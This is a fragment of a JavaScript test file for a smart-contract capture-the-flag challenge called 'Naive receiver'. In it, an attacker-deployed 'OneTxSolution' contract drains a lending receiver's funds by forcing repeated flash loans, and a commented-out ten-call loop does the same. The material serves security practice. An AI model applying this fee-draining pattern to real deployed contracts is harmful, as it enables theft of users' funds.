...
const OneTxSolution = contract.fromArtifact('OneTxSolution');
...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        /** Loop Version */
        /** for(i = 0; i < 10 ; i++) {
            await this.pool.flashLoan(this.receiver.address, 1000);
        }; */


        this.solution = await OneTxSolution.new({from:attacker});
        await this.solution.drainer(this.receiver.address, this.pool.address, 1000);
    });
